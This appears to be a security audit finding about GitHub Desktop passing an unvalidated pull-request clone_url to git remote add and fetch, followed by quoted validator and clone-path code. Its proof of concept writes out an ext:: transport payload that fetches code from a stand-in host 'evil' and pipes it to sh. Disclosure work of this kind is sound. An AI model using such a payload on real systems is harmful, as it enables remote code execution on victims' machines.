## Analysis

The Sherlock report's broken invariant is: an endpoint accepts a **partially-trusted, externally supplied parameter** (a URL/selector) and passes it straight into a privileged execution path without validating that the parameter cannot smuggle unintended semantics (an arbitrary "borrower"/target). The Desktop analog with the same shape — an externally-sourced string is forwarded unchecked into a **command that git itself will interpret**, letting the attacker choose execution semantics rather than just data — is the pull-request "check out remote branch" flow, where `head.repo.clone_url` (a GitHub API/proxy-controlled value) is fed straight into `git remote add` and later `git fetch` with no protocol allow-listing.

### Title
Unvalidated PR head `clone_url` from GitHub API/proxy response is passed to `git remote add`/`fetch`, enabling `ext::` transport command execution - (File: app/src/lib/git/remote.ts)

### Summary
When a user opens/checks out a pull request, Desktop calls `_findPullRequestBranch`, which takes `headCloneUrl` straight from the pull request API object and, if no existing remote matches it, calls `addRemote(repository, forkRemoteName, headCloneUrl)` followed by a `git fetch` of that remote. [1](#0-0) [2](#0-1) 

`addRemote` builds the git invocation as `git(['remote', 'add', name, url], ...)` with `url` used verbatim — there is no scheme allow-list (e.g. restricting to `https:`/`ssh:`) anywhere in this path, unlike the GHE server-URL validator that explicitly forces `https:` only. [3](#0-2) [4](#0-3) 

`headCloneUrl` reaches this code from two callers: the "Open in Desktop" PR flow (`openPullRequestFromUrl` → `appStore.fetchPullRequest` → `_checkoutPullRequest`) and the in-app PR list checkout (`checkoutPullRequest` → `pullRequest.head.gitHubRepository.cloneURL`). Both ultimately originate from a GitHub API JSON response for the pull request's `head.repo.clone_url` field. [5](#0-4) [6](#0-5) 

### Finding Description
Git supports remote-helper transports invoked via the `<transport>::<address>` URL syntax, most notably `ext::<command>`, which executes an arbitrary shell command as part of `git remote add`/`git fetch`/`git clone`. This is a long-standing, well-known Git attack surface (the basis of several past CVEs in Git clients that failed to restrict transport schemes for externally supplied remote URLs).

Desktop's `addRemote` (`app/src/lib/git/remote.ts:29-37`) does not filter or allow-list the `url` argument before invoking `git remote add name url`. The value flows in from a value that Desktop treats as trustworthy application data (a GitHub API pull-request object) but which is only as trustworthy as the channel that delivered it — i.e., the GitHub API response itself. If that response is delivered by, or tampered with by, an attacker-controlled proxy/MITM (the "git remote/proxy response" attacker primitive explicitly listed as in-scope), or via any code path that constructs `IAPIPullRequest`/`PullRequest.head` values from data that isn't strictly the GitHub REST schema (e.g. a compromised GHE instance, or a custom API integration), the `clone_url`/`cloneURL` string can be set to `ext::sh -c ...` or similar.

This differs from the `remote-parsing.ts` GitHub URL regex validators, which are used to *identify* GitHub repos for matching/UX purposes but are not used as a gate before `addRemote` is called — `_findPullRequestBranch` calls `addRemote` directly on any URL that didn't match an existing remote, with no scheme check. [7](#0-6) 

Unlike `clone.ts`, which has an explicit hardening comment and `isClonePathSensitive` backstop against path-traversal via crafted URLs, there is no equivalent scheme/transport backstop in `remote.ts` or in the PR-checkout code path. [8](#0-7) 

### Impact Explanation
If exploited, this results in arbitrary command execution in the context of the Desktop process/user when the user simply views or checks out a pull request — a `git remote add`/`git fetch` invocation with an `ext::` URL runs attacker-chosen shell commands with the privileges of the user running Desktop. This satisfies the "code execution" impact bucket explicitly allowed by the task (attacker controls a GitHub API object / remote-proxy response, resulting in code execution).

### Likelihood Explanation
Likelihood is bounded by the fact that `clone_url` is normally server-generated by github.com and not directly attacker-editable by a PR author. Exploitation therefore requires the attacker to control or tamper with the API/proxy channel delivering the pull-request JSON (e.g., a malicious/compromised HTTP(S) proxy, DNS/TLS interception, or a compromised/custom GHE-compatible API endpoint) — this matches the explicitly in-scope "git remote/proxy response" attacker model, but is not exploitable by an ordinary external contributor opening a PR against a normal, uncompromised github.com session.

### Recommendation
Before calling `addRemote`/`setRemoteURL` with any externally sourced URL (PR `head.repo.clone_url`, "Open in Desktop" deep-link URL, etc.), validate the scheme against an allow-list (`https:`, `ssh:`, `git:`, `http:`), rejecting `ext::`, `fd::`, or any other Git remote-helper transport syntax, similar to the existing `validateURL` check used for GHE server addresses (`app/src/ui/lib/enterprise-validate-url.ts:14-45`). Apply this validation centrally inside `addRemote`/`setRemoteURL` in `app/src/lib/git/remote.ts` so all callers (PR checkout, "Open in Desktop", clone-by-alias) are protected regardless of call site.

### Proof of Concept
1. Attacker positions themselves as (or compromises) a network proxy/MITM in the path of Desktop's GitHub API requests, or otherwise controls the JSON returned for a pull request lookup.
2. Craft the PR API response so `head.repo.clone_url` = `ext::sh -c "curl http://evil/x|sh"`.
3. Victim, using Desktop, opens the pull request (via "Open in Desktop" link or in-app PR list) and Desktop calls `dispatcher.checkoutPullRequest`/`openPullRequestFromUrl`, which flows into `appStore._checkoutPullRequest` → `_findPullRequestBranch`. [9](#0-8) 
4. Since no local remote matches this URL, Desktop calls `addRemote(repository, forkRemoteName, headCloneUrl)`, executing `git remote add github-desktop-<owner> "ext::sh -c \"curl http://evil/x|sh\""`. [3](#0-2) 
5. The subsequent `this._fetchRemote(repository, remote, ...)` call invokes `git fetch` on that remote, causing git to execute the `ext::` command, achieving code execution under the victim's user account. [10](#0-9)

export function validateURL(address: string): string {
  // ensure user has specified text and not just whitespace
  // we will interact with this server so we can be fairly
  // relaxed here about what we accept for the server name
  const trimmed = address.trim()
  if (trimmed.length === 0) {
    const error = new Error('Unknown address')
    error.name = InvalidURLErrorName
    throw error
  }

  let url = URL.parse(trimmed)
  if (!url.host) {
    // E.g., if they user entered 'ghe.io', let's assume they're using https.
    address = `https://${trimmed}`
    url = URL.parse(address)
  }

  if (!url.protocol) {
    const error = new Error('Invalid URL')
    error.name = InvalidURLErrorName
    throw error
  }

  if (url.protocol !== 'https:') {
    const error = new Error('Invalid protocol')
    error.name = InvalidProtocolErrorName
    throw error
  }

  return address
}

      log.warn(
        `Received a non-GitHub repository when opening repository from URL: ${url}`
      )
      return null
    }

    // up-to-date before performing the "Clone in Desktop" steps

      return null

      repository,
      pullRequest.number,
      pullRequest.head.repo.owner.login,
      pullRequest.head.repo.clone_url,

/**
 * Check whether a resolved clone path targets a sensitive location that
 * should never be used as a clone destination. This is a backstop against
 * path traversal attacks where a crafted URL tricks the UI into deriving
 * a clone path outside the intended base directory.
 */
function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}
